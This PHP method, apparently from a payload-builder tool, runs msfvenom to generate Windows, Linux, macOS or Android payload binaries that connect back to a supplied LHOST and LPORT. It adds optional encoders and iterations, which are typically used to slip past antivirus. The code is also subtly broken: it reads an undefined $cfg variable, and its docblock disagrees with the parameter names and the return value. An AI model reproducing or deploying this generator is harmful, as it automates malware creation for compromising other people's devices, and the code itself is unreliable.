    /**
     * Execute msfvenom to generate binary payload.
     *
     * @param string $platform   android, windows, linux, osx
     * @param string $payload    msfvenom payload name
     * @param string $lhost
     * @param int    $lport
     * @param string $format     exe, elf, apk, osx, dmg, raw, python, etc.
     * @return array ['payload' => binary, 'warning' => null]
     * @throws Exception
     */
    private function msfvenom_generate($platform, $payload_name, $lhost, $lport, $format) {
        $platform_map = [
            'windows' => 'windows',
            'linux'   => 'linux',
            'macos'   => 'osx',
            'android' => 'android'
        ];
        $p = $platform_map[$platform] ?? $platform;

        // Build full payload string
        if (strpos($payload_name, $p) !== 0) {
            $payload_full = $p . '/' . $payload_name;
        } else {
            $payload_full = $payload_name;
        }

        $cmd = sprintf(
            'msfvenom -p %s LHOST=%s LPORT=%s -f %s',
            escapeshellarg($payload_full),
            escapeshellarg($lhost),
            escapeshellarg($lport),
            escapeshellarg($format)
        );

        // Optional extra encoders / iterations
        if (!empty($cfg['extra']['encoder'])) {
            $cmd .= ' -e ' . escapeshellarg($cfg['extra']['encoder']);
        }
        if (!empty($cfg['extra']['iterations'])) {
            $cmd .= ' -i ' . (int)$cfg['extra']['iterations'];
        }

        $output = shell_exec($cmd . ' 2>&1');
        if (empty($output)) {
            throw new Exception("Msfvenom execution failed or produced empty output.");
        }

        // Msfvenom may print progress info – try to detect raw payload
        // If output starts with non‑binary text, try to strip it (msfvenom often prints to stderr)
        if (strpos($output, 'Payload size:') !== false || strpos($output, 'Saved as:') !== false) {
            // We need to separate binary from text. Use proc_open? For simplicity,
            // assume the last part is binary or we run again with -o /dev/stdout.
            // Better: use temporary file.
            $tmp = tempnam(sys_get_temp_dir(), 'msf_');
            $cmd = sprintf(
                'msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s >/dev/null 2>&1',
                escapeshellarg($payload_full),
                escapeshellarg($lhost),
                escapeshellarg($lport),
                escapeshellarg($format),
                $tmp
            );
            shell_exec($cmd);
            if (!file_exists($tmp)) {
                throw new Exception("Msfvenom failed to write output file.");
            }
            $payload_bin = file_get_contents($tmp);
            unlink($tmp);
        } else {
            $payload_bin = $output;
        }

        return ['payload' => $payload_bin];
    }

